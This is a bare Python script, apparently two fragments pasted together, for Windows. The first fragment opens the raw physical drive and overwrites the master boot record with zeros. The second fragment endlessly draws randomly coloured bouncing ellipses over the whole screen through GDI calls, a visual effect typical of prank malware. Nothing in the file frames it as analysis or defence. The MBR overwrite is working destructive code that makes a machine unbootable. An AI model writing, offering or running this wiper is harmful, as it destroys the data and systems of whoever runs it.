import os
import ctypes
import random
import time
def overwrite_mbr():
    mbr_data = b'\x00' * 512
    with open('\\\\.\\PhysicalDrive0', 'rb+') as physical_drive:
        physical_drive.write(mbr_data)

if __name__ == "__main__":
    overwrite_mbr()
import ctypes
import random
import time

def get_system_metrics(nIndex):
    return ctypes.windll.user32.GetSystemMetrics(nIndex)

def get_dc(hWnd):
    return ctypes.windll.user32.GetDC(hWnd)

def create_solid_brush(color):
    return ctypes.windll.gdi32.CreateSolidBrush(color)

def select_object(hdc, hgdiobj):
    return ctypes.windll.gdi32.SelectObject(hdc, hgdiobj)

def release_dc(hWnd, hDC):
    return ctypes.windll.user32.ReleaseDC(hWnd, hDC)

def delete_object(hObject):
    return ctypes.windll.gdi32.DeleteObject(hObject)

def ellipse(hdc, left, top, right, bottom):
    return ctypes.windll.gdi32.Ellipse(hdc, left, top, right, bottom)

def main():
    w = get_system_metrics(0)
    h = get_system_metrics(1)
    signX = 1
    signY = 1
    signX1 = 1
    signY1 = 1
    incrementor = 10
    x = 10
    y = 10

    while True:
        hdc = get_dc(0)
        x += incrementor * signX
        y += incrementor * signY
        top_x = 0 + x
        top_y = 0 + y
        bottom_x = 100 + x
        bottom_y = 100 + y
        brush = create_solid_brush((random.randint(0, 255) << 16) | (random.randint(0, 255) << 8) | random.randint(0, 255))
        select_object(hdc, brush)
        ellipse(hdc, top_x, top_y, bottom_x, bottom_y)

        if y >= get_system_metrics(1):
            signY = -1

        if x >= get_system_metrics(0):
            signX = -1

        if y == 0:
            signY = 1

        if x == 0:
            signX = 1

        time.sleep(0.01)
        delete_object(brush)
        release_dc(0, hdc)

if __name__ == "__main__":
    main()
